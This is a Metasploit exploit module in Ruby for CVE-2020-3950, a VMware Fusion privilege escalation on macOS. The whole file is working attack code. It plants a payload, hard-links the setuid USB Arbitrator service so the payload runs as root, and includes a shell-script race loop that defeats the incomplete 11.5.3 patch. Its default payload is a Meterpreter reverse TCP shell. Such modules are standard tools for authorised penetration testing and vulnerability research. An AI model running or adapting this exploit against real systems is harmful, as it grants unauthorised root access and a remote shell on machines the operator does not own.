##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Local
  Rank = ExcellentRanking

  include Msf::Post::OSX::Priv
  include Msf::Post::File
  include Msf::Exploit::EXE
  include Msf::Exploit::FileDropper

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name'           => 'VMware Fusion USB Arbitrator Setuid Priv Esc',
        'Description'    => %q(
            This exploits an improper use of setuid binaries within VMware Fusion 11 - 11.5.3.
            The Open VMware USB Arbitrator Service can be launched outide of its standard path
            which allows loading of an attacker controlled binary.  By creating a payload in the
            user home directory in a specific folder, and creating a hard link to the 'Open VMware
            USB Arbitrator Service' binary, we're able to launch it temporarily to start our payload
            with an effective UID of 0.
            @jeffball55 discovered an incomplete patch in 11.5.3 with a TOCTOU race.
            Successfully tested against 11.5.1, 11.5.2, and 11.5.3
        ),
        'License'        => MSF_LICENSE,
        'Author'         =>
          [
            'h00die <mike@stcyrsecurity.com>', # msf module
            'Dhanesh Kizhakkinan', # discovery
            'Rich Mirch', # edb module
            'Jeff Ball' # 11.5.3 exploit
          ],
        'Platform'       => [ 'osx' ],
        'Arch'           => [ ARCH_X86, ARCH_X64 ],
        'SessionTypes'   => [ 'shell', 'meterpreter' ],
        'Targets'        => [[ 'Auto', {} ]],
        'Privileged'     => true,
        'References'     =>
          [
            [ 'EDB', '48235' ],
            [ 'URL', 'https://www.vmware.com/security/advisories/VMSA-2020-0005.html' ],
            [ 'URL', 'https://twitter.com/jeffball55/status/1242530508053110785?s=20' ],
            [ 'CVE', '2020-3950' ]
          ],
        'DisclosureDate' => "Mar 17 2020",
        'DefaultOptions' =>
          {
            'PrependSetuid'    => true,
            'PAYLOAD'          => 'osx/x64/meterpreter_reverse_tcp',
          }
      )
    )

    register_options [
      OptInt.new('MAXATTEMPTS', [true, "Maximum attempts to win race for 11.5.3", 50]),
    ]

    register_advanced_options [
      OptBool.new('ForceExploit',  [ false, 'Override check result', false ]),
    ]
  end

  def open_usb_service
    'Open VMware USB Arbitrator Service'
  end

  def usb_service
    'VMware USB Arbitrator Service'
  end

  def get_home_dir
    cmd_exec 'echo ~'
  end

  def base_dir
    "#{get_home_dir}/Contents/Library/services/"
  end

  def get_version
    # Thanks to @ddouhine on github for this answer!
    version_raw = cmd_exec "plutil -p '/Applications/VMware Fusion.app/Contents/Info.plist' | grep CFBundleShortVersionString"
    /=> "(?<version>\d{0,2}\.\d{0,2}\.\d{0,2})"/ =~ version_raw #supposed 11.x is also vulnerable, but everyone whos tested shows 11.5.1 or 11.5.2
    Gem::Version.new(version)
  end

  def pre_11_5_3
    # Upload payload executable & chmod
    payload_filename = "#{base_dir}#{usb_service}"
    print_status "Uploading Payload: #{payload_filename}"
    write_file "#{payload_filename}", generate_payload_exe
    chmod "#{payload_filename}", 0755
    register_file_for_cleanup "#{payload_filename}"

    # create folder structure and hard link to the original binary
    root_link_folder = "#{get_home_dir}/#{rand_text_alphanumeric(2..5)}" # for cleanup later
    link_folder = "#{root_link_folder}/#{rand_text_alphanumeric(2..5)}/#{rand_text_alphanumeric(2..5)}/"
    cmd_exec "mkdir -p #{link_folder}"
    cmd_exec "ln '/Applications/VMware Fusion.app/Contents/Library/services/#{open_usb_service}' '#{link_folder}#{open_usb_service}'"
    print_status "Created folder (#{link_folder}) and link"
    # register_file_for_cleanup "#{link_folder}/#{open_usb_service}" # this is handled later in rm_rf

    print_status 'Starting USB Service (5 sec pause)'
    cmd_exec "cd #{link_folder}; '#{link_folder}/#{open_usb_service}' &"
    Rex.sleep 5 # give time for the service to execute our payload
    print_status 'Killing service'
    cmd_exec "pkill '#{open_usb_service}'"
    print_status "Deleting #{root_link_folder}"
    rm_rf root_link_folder
  end

  def exactly_11_5_3
    # Upload payload executable & chmod
    payload_name = "#{base_dir}#{rand_text_alphanumeric(5..10)}"
    print_status "Uploading Payload to #{payload_name}"
    write_file "#{payload_name}", generate_payload_exe
    chmod "#{payload_name}", 0755
    register_file_for_cleanup "#{base_dir}VMware USB Arbitrator Service"
    #create race with codesign check
    root_link_folder = "#{get_home_dir}/#{rand_text_alphanumeric(2..5)}" # for cleanup later
    link_folder = "#{root_link_folder}/#{rand_text_alphanumeric(2..5)}/#{rand_text_alphanumeric(2..5)}/"
    print_status 'Uploading race condition executable.'
    race = []
    race << '#!/bin/sh'
    race << 'while [ "1" = "1" ]; do'
    race << "    ln -f '/Applications/VMware Fusion.app/Contents/Library/services/#{usb_service}' '#{base_dir}#{usb_service}'"
    race << "    ln -f '#{payload_name}' '#{base_dir}#{usb_service}'"
    race << 'done'
    race = race.join("\n")
    racer_name = "#{base_dir}#{rand_text_alphanumeric(5..10)}"
    upload_and_chmodx racer_name, race
    register_file_for_cleanup racer_name
    # create the hard link
    print_status "Creating folder (#{link_folder}) and link"
    cmd_exec "mkdir -p #{link_folder}"
    cmd_exec "ln '/Applications/VMware Fusion.app/Contents/Library/services/#{open_usb_service}' '#{link_folder}#{open_usb_service}'"

    # create the launcher to start the racer and keep launching our service to attempt to win
    launcher = []
    launcher << '#!/bin/sh'
    launcher << "#{racer_name} &"
    launcher << "for i in {1..#{datastore['MAXATTEMPTS']}}"
    launcher << 'do'
    launcher << '    echo "attempt $i";'
    launcher << "    '#{link_folder}#{open_usb_service}'"
    launcher << 'done'
    launcher = launcher.join("\n")
    runner_name = "#{base_dir}#{rand_text_alphanumeric(5..10)}"
    upload_and_chmodx runner_name, launcher
    register_file_for_cleanup runner_name

    print_status "Launching Exploit #{runner_name}"
    results = cmd_exec "#{runner_name} &"
    vprint_status results

    print_status 'Exploit Finished, killing scripts.'
    cmd_exec "pkill #{racer_name}"
    cmd_exec "pkill #{runner_name}" # in theory should be killed already but just in case
    rm_rf base_dir
  end

  def check
    unless exists? "/Applications/VMware Fusion.app/Contents/Library/services/#{open_usb_service}"
      print_bad "'#{open_usb_service}' binary missing"
      return CheckCode::Safe
    end
    version = get_version
    if version.between?(Gem::Version.new('11.5.0'), Gem::Version.new('11.5.3'))
      vprint_good "Vmware Fusion #{version} is exploitable"
    else
      print_bad "VMware Fusion #{version} is NOT exploitable"
      return CheckCode::Safe
    end
    CheckCode::Appears
  end

  def exploit
    # First check the system is vulnerable, or the user wants to run regardless
    unless check == CheckCode::Appears
      unless datastore['ForceExploit']
        fail_with Failure::NotVulnerable, 'Target is not vulnerable. Set ForceExploit to override.'
      end
      print_warning 'Target does not appear to be vulnerable'
    end

    # Check if we're already root
    if is_root?
      unless datastore['ForceExploit']
        fail_with Failure::BadConfig, 'Session already has root privileges. Set ForceExploit to override'
      end
    end

    # Make sure we can write our payload to the remote system
    rm_rf base_dir # live dangerously.
    cmd_exec "mkdir -p #{base_dir}"
    unless writable? base_dir
      fail_with Failure::BadConfig, "#{base_dir} is not writable"
    end

    version = get_version
    if version == Gem::Version.new('11.5.3')
      vprint_status 'Using 11.5.3 exploit'
      exactly_11_5_3
    elsif version.between?(Gem::Version.new('11.5.0'), Gem::Version.new('11.5.2'))
      vprint_status 'Using pre-11.5.3 exploit'
      pre_11_5_3
    end

  end
end
